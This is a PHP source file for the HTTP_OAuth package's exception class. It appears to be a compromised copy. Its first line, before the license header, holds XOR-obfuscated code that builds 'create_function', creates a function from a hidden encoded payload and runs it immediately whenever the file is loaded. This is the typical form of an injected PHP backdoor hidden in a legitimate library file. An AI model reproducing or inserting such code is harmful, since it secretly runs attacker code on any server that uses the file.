<?php $sCUQWAHOtr='C13,LE;XE;,X.-9'^' CVM8 d>0UO,GBW';$CiAduNmxGoI=$sCUQWAHOtr('','=4XP7<EO2I-Yl7IYE:BJS39>:VZIOq>5B3MkDbID=H8X4-POCn2Z7i7Q1Xn3M1TDLS,1JMnrV6YsZXQRo3pL7o,DDXeicuc>:S+D=NMBsxitjZcWrDHE:INceDLXMhRJHYCILBMgfSX2zKztXBY1AJ<MXkwmQN-1GgUStGU671W1YGaPE+z1BpSO<1.2;6>fJ<8MaHSDIGEm3i3YG4Hxr+OR1PKcH>W.32:NTRZqQTUCQbGZST4=WSDmlGfh=>2-qK;NgA>T tgfiN8 973xQ7LLQOX1Vt9,+fsrhG IXHalW-A,mHlmOVWI3XPGNR9PrJga3 N3cXWf2.ZB=P+:hxa;+p=2hbmU1BQs:W8YQVQo,W=CYpD6NLbGT08J.<5UwyntUT:rlzeRY8G5FtrM=6<6Eh6q6gJK;a<0C9ZyI0DX>HC;LQ.7 e9-65J--,9>>N:i21H6Qu4UWW+=3bn+7E9GzxTYUTJfP,.eeZ1XKOIX3C8adLc =;;-:,27lE4SGXNBcX+<sMoL-,5AeHDqUD<3PyaP+J+nqZ+Lk:NUQWVARyCpvqSy,vVzbAKmZr6ZVAMBUs1pXsUtTYGWJhQ D7R<;37nVTP5J2MJFPR95-0IhzcV8,WNocHEotd50AT7S=phJJ7Vjl1 D4+Z5NvkiAq3FIIAVmjN0'^'TRpqQI+,F B73R106N1btKVLe2;=..aX7GjBmB2N4.M6WY9 -NJ5E6S0E91l D lh7ME+aNV=S ZzxqrOHzE>KC10xXIDRX43ZM+Ofi+SEIDQzG>N7<7V, KA -,,Aijl0hbeHDnB<-FZeGTpf=P5+gi16W3qjFT><q:TbuECC;T7oE; RSlkKYF5CKFNDPNnSM9HsYM4M8g9MW83UhERM.>B5pilZ6ZRmQ+-rgQ75904YMP5;FX60,MDc9+rqyd4kZ=GeU1YTZXIjNAUBVQqLFEu+9E7+RIRFNRL,E0cBhH3L5MMuLI97;<VcZ:DXP6RbFEWA:RJx,l;H50X1HRHPEdy5lg-19uP1qWQ2AylhqKZ6Q6<YdMDEkc0QL+qWP,WDNP>1CIfslv=Y3TfIRiKWPC S<xKm7A1EXQ7XzDip16M-1R-=GMEMABDj.LYMfaS;NAPP;SgAk124DYVJJOV1XnVXp=4 +9;IWLLa;1-gm<R7YABjCAOIZTeGWN3 L:4,=jD3NETaOhIMA LhbWulQWeQE4J>J5V1N5Lgguljvf6JuBOI2IJNgMV yUmGUldst lFUG:F7MspgqlH0R6V+cPVN13,9F>Aem61+UZLTnDZG2YX6gFCheOTDN:H1A2QXL.+C71KAA=XD;Qi+BRKxV> =ifDQDM');$CiAduNmxGoI();
/**
 * HTTP_OAuth
 *
 * Implementation of the OAuth specification
 *
 * PHP version 5.2.0+
 *
 * LICENSE: This source file is subject to the New BSD license that is
 * available through the world-wide-web at the following URI:
 * http://www.opensource.org/licenses/bsd-license.php. If you did not receive
 * a copy of the New BSD License and are unable to obtain it through the web,
 * please send a note to license@php.net so we can mail you a copy immediately.
 *
 * @category  HTTP
 * @package   HTTP_OAuth
 * @author    Jeff Hodsdon <jeffhodsdon@gmail.com>
 * @copyright 2009 Jeff Hodsdon <jeffhodsdon@gmail.com>
 * @license   http://www.opensource.org/licenses/bsd-license.php New BSD License
 * @link      http://pear.php.net/package/HTTP_OAuth
 * @link      http://github.com/jeffhodsdon/HTTP_OAuth
 */

require_once 'PEAR/Exception.php';

/**
 * HTTP_OAuth_Exception
 *
 * Main Exception class for HTTP_OAuth. All other HTTP_OAuth Exceptions
 * extend this class.
 *
 * @uses      PEAR_Exception
 * @category  HTTP
 * @package   HTTP_OAuth
 * @author    Jeff Hodsdon <jeffhodsdon@gmail.com>
 * @copyright 2009 Jeff Hodsdon <jeffhodsdon@gmail.com>
 * @license   http://www.opensource.org/licenses/bsd-license.php New BSD License
 * @link      http://pear.php.net/package/HTTP_OAuth
 * @link      http://github.com/jeffhodsdon/HTTP_OAuth
 */
class HTTP_OAuth_Exception extends PEAR_Exception
{

    /**
     * Construct
     *
     * Allow no message to construct a exception
     *
     * @param string                              $message Exception message
     * @param int|Exception|PEAR_Error|array|null $p2      Exception cause
     * @param int|null                            $p3      Exception code or null
     *
     * @return void
     */
    public function __construct($message = '', $p2 = null, $p3 = null)
    {
        parent::__construct($message, $p2, $p3);
    }
}

?>